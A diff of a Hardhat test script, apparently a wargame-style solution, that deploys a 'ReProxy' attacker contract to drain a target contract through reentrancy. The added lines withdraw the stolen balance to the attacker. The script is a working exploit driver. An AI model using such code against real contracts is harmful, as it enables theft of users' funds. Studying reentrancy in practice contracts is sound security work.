@@ -20,7 +20,7 @@ describe("reenterancy", function() {
             "function donate(address _to) public payable",
         ];
 
-        const targetAddr = "0x292351a7405Dc5E64371659c1311c15c25a3d589";
+        const targetAddr = "0xcc99BDa3FD9d076c4ABCA9E2637310a814E5BbC3";
         let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
         targetCont = targetCont.connect(eoa);
 
@@ -28,7 +28,7 @@ describe("reenterancy", function() {
         const proxyFactory = await ethers.getContractFactory("ReProxy");
         const proxyCont = await proxyFactory.deploy(targetAddr, donation);
         await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash) ;
-        console.log("ReProxy deployed at: " + proxyCont.deployTransaction.hash);
+        console.log("ReProxy deployed at: " + proxyCont.address);
 
         // target's initial balance
         balance = await eoa.provider!.getBalance(targetAddr);
@@ -49,5 +49,9 @@ describe("reenterancy", function() {
         console.log(utils.formatEther(balance));
 
         expect(balance).to.eq(0);
+
+        tx = await proxyCont.withdraw();
+        await tx.wait();
+        console.log(tx);
     });
 });
